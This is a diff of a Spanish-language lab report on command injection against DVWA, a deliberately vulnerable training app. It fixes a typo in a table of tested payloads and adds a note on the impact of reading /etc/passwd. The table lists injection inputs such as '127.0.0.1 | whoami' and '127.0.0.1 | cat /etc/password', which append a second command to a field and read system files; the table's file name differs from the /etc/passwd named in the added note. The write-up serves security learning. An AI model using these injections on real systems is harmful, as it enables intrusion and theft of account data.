@@ -33,8 +33,9 @@ Se han validado los siguientes ataques para demostrar que, a pesar del filtrado 
 | whoami            | 127.0.0.1 \| whoami        | www-data                                       | Usuario con el que corre el servidor.                        |
 | pwd               | 127.0.0.1 \| pwd           | /var/www/html/DVWA/vulnerabilities/exec        | Ruta absoluta del directorio vulnerable.                     |
 | ls                | 127.0.0.1 \| ls            | help, index.php, source                        | Estructura interna de archivos del servidor.                 |
-| cat /etc/password                | 127.0.0.1 \| cat /etc/password            | Lista de usuarios                       | Extracción de cuentas dle sistema(root,bin,etc.).                 |
+| cat /etc/password                | 127.0.0.1 \| cat /etc/password            | Lista de usuarios                       | Extracción de cuentas del sistema(root,bin,etc.).                 |
 
+**Impacto Crítico**: El acceso al archivo **/etc/passwd** permite a un atacante conocer todos los usuarios del sistema, directorios home y shells asignadas, facilitando ataques de fuerza bruta o escalada de privilegios.
 
 <img width="588" height="284" alt="image" src="https://github.com/user-attachments/assets/c84a9aee-5530-46f0-8534-5e1687fbd79a" />
 
